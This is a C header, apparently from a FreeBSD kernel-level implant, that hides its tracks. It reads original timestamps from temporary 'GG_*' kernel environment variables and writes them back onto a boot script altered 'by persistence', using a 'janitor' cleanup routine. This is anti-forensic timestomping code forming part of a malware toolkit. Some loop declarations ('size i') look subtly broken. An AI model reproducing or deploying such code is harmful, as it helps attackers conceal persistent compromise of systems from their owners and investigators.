#ifndef STAGER_TIMES_H
#define STAGER_TIMES_H

#include <sys/stat.h>
#include <sys/systm.h>
#include <sys/libkern.h>

#include "config.h"
#include "janitor.h"

// this is to clean up ALL time metadata
// order of cleanup (see janitor on cleaning them up)
// restore from child to parent, since doing pathname lookups update atime
// !!!stamp atime too!!!

struct stager_time {
	const char* path;
	const char* ka;
	const char* km;
	const char* kc;
	struct timespec at;
	struct timespec mt;
	struct timespec ct;
	struct stat sb;
};

static struct stager_time stager_times[] = {
	{ CFG_HELPER_PATH, "GG_RA", "GG_RM", "GG_RC" }
};

#define NSTAGER_TIMES (sizeof(stager_times)/sizeof(stager_times[0]))

static int stager_have_times;

// read one original timestamp from the temporary GG_* kenv variables.
static
int stager_gettime (const char* name, struct timespec* ts)
{
	char* value = kern_getenv(name);

	if (value==NULL)
		return (0);
	ts->tv_sec = strtouq(value, NULL, 0);
	ts->tv_nsec = 0;
	freeenv(value);
	return (1);
}

// load every original timestamp. all-or-nothing, so we never partially restore.
static
int stager_load_times (void)
{
	for (size i=0; i<NSTAGER_TIMES; i++) {
		struct stager_time * t = &stager_times[i];

		if (!stager_gettime(t->ka, &t->at)||
		    !stager_gettime(t->km, &t->mt)||
		    !stager_gettime(t->kc, &t->ct))
			return (0);
	}
	stager_have_times = 1;
	return (1);
}

// stat every path. at boot, replace current times with the saved originals
// so the next shutdown writes the same baseline again.
static
int stager_stat_times (void)
{
	for (size i=0; i<NSTAGER_TIMES; i++) {
		struct stager_time * t = &stager_times[i];

		int error = kern_statat(curthread, 0, AT_FDCWD, t->path,
		    UIO_SYSSPACE, &t->sb);
		if (error!=0)
			return (error);
		if (stager_have_times) {
			t->sb.st_atim = t->at;
			t->sb.st_mtim = t->mt;
			t->sb.st_ctim = t->ct;
		} else {
			t->at = t->sb.st_atim;
			t->mt = t->sb.st_mtim;
			t->ct = t->sb.st_ctim;
		}
	}
	return (0);
}

// restore the boot script modified by persistence.
static
void stager_restore_times (void)
{
	for (size i=0; i<NSTAGER_TIMES; i++) {
		struct stager_time * t = &stager_times[i];
		struct janitor_snap snap = {
			.atime = t->at,
			.mtime = t->mt,
			.ctime = t->ct
		};

		(void)janitor_restore_times(t->path, &snap);
	}
}

#endif
